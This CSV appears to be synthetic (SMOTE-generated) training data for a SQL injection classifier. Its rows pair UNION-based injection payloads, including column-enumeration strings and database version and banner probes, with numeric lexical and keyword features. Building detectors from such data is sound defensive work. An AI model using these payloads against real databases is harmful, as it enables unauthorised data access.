id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000407,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000101,0.5025331987655578,112.88265361334359,27.423469277331282,3.810789348028574,25.0,50.30612289067487,22.0,15.576530722668718,0.22157578337283873,0.445478746603458,0.19498668936809813,0.13795878065560516,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,8.576530722668718,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000408,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000106,0.1553715991472394,88.90028348060248,26.780056696120496,4.027044144410423,25.0,31.120226784481986,22.0,10.780056696120496,0.2813716226124102,0.3498054038201437,0.24760702789892097,0.12121594566852514,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.780056696120497,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000409,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000030,0.29692522587002596,97.1215323501915,26.117129019974467,3.673174271775008,41.88287098002554,4.941435490012768,36.35579039014044,13.941435490012767,0.43169621309742545,0.05085480898331618,0.37378543905540657,0.14366353886385175,3.0,0.0,2.0,0.0,1.0,1.941435490012767,0.0,3.882870980025534,0.0,0.0,1.0,5.058564509987233,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.941435490012767,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.941435490012767
SMOTE_000410,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.10723588282607449,45.73603746314618,18.073603746314618,3.784518126692419,14.0,20.588829970516944,4.0,7.147207492629237,0.3069476668751327,0.4492026664284198,0.08769933339289505,0.15615033330355246,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,3.1472074926292364,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000002,0.0429454190796856,102.69396724243973,26.0,4.072397298916815,65.59195632325297,4.204021838373514,23.897989080813247,9.0,0.6386572488634985,0.04099401751288473,0.23270268558303017,0.08764604804058665,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000412,attack,union,"-7725%'   )    )    union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",nearest_attack_euclidean,R000156,0.032493980062265504,82.87649867787869,21.024700264424265,3.5762174765715513,14.0,39.851798413454425,14.049400528848524,14.975299735575737,0.16896006247065495,0.48071287691064035,0.1696367820439224,0.1806902785747823,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0123501322121315,1.0,0.0,7.962949603363605,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000413,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000002,0.1140007397452052,102.18762090355898,26.0,4.072006041668901,64.91682787141198,4.541586064294009,23.729206967852996,9.0,0.6351505137010234,0.044566299126994835,0.23219470058285854,0.08808848658912322,0.0,0.0,2.0,0.0,1.0,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000414,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000142,0.07764092138234761,87.76591475525937,21.941478688814843,3.5887694710622497,14.0,44.0,13.804928962716144,15.960985792543228,0.15958092006973215,0.5015400345048726,0.15701419589494459,0.18186484953045068,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.9609857925432288,1.0,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9804928962716144,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000415,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000005,2.190206697845197,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,1.0291187917409765,2.9708812082590237,0.0,0.0,0.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.257279697935244,0.7427203020647559,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000416,attack,union,"-9577'||  (  select 'vloa' from dual where 7184  =  7184 union all select 7184,7184#",nearest_attack_euclidean,R000118,0.03673761533851029,84.26528230029072,31.026528230029072,4.391025870167005,37.0,20.212225840232573,17.0,10.053056460058144,0.43923309965669244,0.23968101881632747,0.2018098025449668,0.11927607898201328,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0530564600581434,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000417,attack,union,"-9577'||  (  select 'vloa' from dual where 7184  =  7184 union all select 7184,7184#",nearest_attack_euclidean,R000118,0.5831997387014136,88.21128499455642,31.42112849945564,4.421548356757741,37.0,23.36902799564514,17.0,10.842256998911285,0.4207424588654271,0.2632690795014011,0.19331410272195299,0.1226743589112188,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.8422569989112856,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000418,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000009,0.865131594979047,86.1096218875971,27.698625444628988,3.93437425237124,42.0,3.3013745553710123,26.80824733222608,14.0,0.4892366230224638,0.03802072363804343,0.3096637789986715,0.16307887434082124,3.0,1.6986254446289863,2.0,0.0,1.0,1.150687277685507,0.0,2.301374555371014,0.0,0.0,1.0,5.0,1.0,0.8493127223144931,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000419,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000046,0.1331433056563936,108.07125064788764,27.0,4.0575338926740185,29.0,48.8570005183101,15.0,15.214250129577525,0.2684357252345843,0.45195919762688375,0.13884606477650913,0.14075901236202276,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.214250129577525,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000420,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R000126,0.6997785616895692,62.15430929978062,20.0,3.812013573625656,14.0,32.9234474398245,4.0,11.230861859956125,0.2313835045023671,0.5223397945971595,0.06610957271496204,0.1801671281855114,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,6.230861859956124,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000421,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000087,0.2297711243471078,56.6699908323039,19.0,3.642951896662173,14.0,29.335992665843122,4.0,9.33399816646078,0.24746064495386222,0.5171878343384431,0.07070304141538922,0.1646484792923054,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.3339981664607805,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000422,attack,union,"-3581'||  (  select 'uxmh' from dual where 8954  =  8954 union all select 8954,8954,8954,8954,8954,8954#",nearest_attack_euclidean,R000111,0.12237533239180284,104.74275974095124,30.925724025904877,4.346811879418486,37.0,36.594207792761,17.0,14.14855194819025,0.3536381738201616,0.3488723836672533,0.16248240418764182,0.13500703832494326,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.14855194819025,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000423,attack,union,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",nearest_attack_euclidean,R000102,0.2578865805223316,110.59684489685645,28.238737958742583,4.168841194935876,29.954951834970334,47.522524082514835,15.238737958742583,17.88063102062871,0.270572031607739,0.42994696395474474,0.13773189739200292,0.16174910704551318,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.880631020628709,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.11936897937129176,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.119368979371291
SMOTE_000424,attack,union,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",nearest_attack_euclidean,R000154,0.889015393770324,105.90996241576663,29.0,4.008691077850181,31.11633630237573,44.0,15.529084075593932,15.264542037796966,0.2929308234617159,0.416280161276296,0.14655477972659475,0.14423423553539327,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.0,3.264542037796966,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2645420377969663,2.0,1.0,1.0,0.2645420377969663,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.264542037796966
SMOTE_000425,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000113,0.3177444269367218,102.22134191706367,28.0,4.0813754299097385,29.0,42.57707353365093,15.0,15.644268383412733,0.2838559716788222,0.4163050313858679,0.14682205431663217,0.1530169426186777,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.644268383412734,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000426,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000113,0.10767552682202884,103.22891623545488,28.0,4.038108441546721,29.0,43.3831329883639,15.0,15.845783247090974,0.281133534080586,0.4199850160014148,0.14541389693823412,0.15346755297976508,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.845783247090974,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000427,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000079,1.1718995962509424,40.58740541258662,20.162483308103518,3.9219692902182564,19.037427668448586,8.0,9.16248330810352,4.3874944360345065,0.4573522865922949,0.20490239717376418,0.22769618752873516,0.11004912870520575,0.38749443603450673,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,3.0,0.38749443603450673,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000428,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000021,1.2411456777907302,75.31559716664545,31.631194333290892,4.373915412637884,44.737611333418215,2.3155971666454462,17.0,11.262388666581787,0.594176031638715,0.030708525116687313,0.2257254119591276,0.1493900312854701,0.94679149993634,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.0,0.3155971666454466,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000429,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000030,0.6341197218370067,97.88639785218447,26.11360214781553,3.6700916592286177,42.795215034708704,4.772795704368939,36.54559140873788,13.772795704368942,0.43727144578263255,0.04873784870263348,0.37330856696039205,0.14068213855434186,2.6591935565534124,0.11360214781552921,2.0,0.0,1.0,1.8863978521844706,0.0,4.0,0.0,0.0,1.0,4.886397852184471,0.8863978521844706,0.11360214781552924,1.0,0.11360214781552927,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000430,attack,union," select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000033,0.3958064500922183,109.34739309856923,28.0,3.9938535563484594,62.463190798092306,4.0,31.115797699523075,11.768404600953849,0.5711786881455414,0.03658342296901401,0.28455543604131467,0.10768245284412997,2.652606901430773,0.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,1.0,5.115797699523076,0.8842023004769244,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000431,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000142,0.6329856939871643,84.23290368110682,22.37670963188932,3.6946783151219895,14.0,40.98632294488545,14.0,15.246580736221363,0.1667743806038031,0.485511168004257,0.16677438060380312,0.1809400707881368,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0,1.0,0.0,8.246580736221363,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000117,0.38141333227094537,82.42311785670786,26.257688214329214,3.999111037431877,25.0,25.938494285366296,22.0,9.484623571341574,0.3042230672285966,0.3132430924342454,0.267716299161165,0.11481754117599295,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,2.484623571341574,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000433,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000025,0.08456648874736762,75.0,32.0,4.396529272887047,44.0,2.024760058233234,17.0,11.975239941766764,0.5866666666666667,0.02699680077644312,0.22666666666666666,0.15966986589022353,0.0,0.0,2.0,0.0,1.975239941766765,1.0,0.0,-1.1102230246251565e-16,0.024760058233235016,0.0,1.0,6.975239941766764,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000434,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,0.28363494712591636,69.93230433761443,24.475692754984742,4.173841827226574,27.0,23.14584347009154,11.0,8.786460867522885,0.3892307861736645,0.32715667457421493,0.15857550547815963,0.12503703377396092,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,3.786460867522885,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,0.6826064645553559,75.37606223985863,27.792020746619542,4.165129090577911,26.056027662159387,25.056027662159387,15.735993084460153,8.528013831079694,0.34542072558322245,0.3321190320048494,0.20960750072299586,0.11285274168893228,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.264006915539847,4.264006915539847,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.2640069155398468,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.264006915539847
SMOTE_000436,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000067,0.32876335357060577,87.32194321899452,29.464388643798905,4.303108180742716,37.0,21.857554575195618,17.0,11.464388643798904,0.42465487317612416,0.24909638074448753,0.19511169848632734,0.13113704759306097,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.464388643798904,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000437,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000133,0.15596808591957106,88.80265907909742,28.0,4.250807190070643,29.0,31.042127263277944,15.0,13.760531815819487,0.32736635358609995,0.348460201950207,0.16932742426867237,0.1548460201950207,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.760531815819486,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000438,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000085,0.006429430392827549,59.953270499748086,19.0,3.599125550632781,14.0,31.96261639979847,4.0,9.990654099949618,0.23353157969803845,0.5331067660593847,0.06672330848515384,0.16663834575742306,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.990654099949617,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
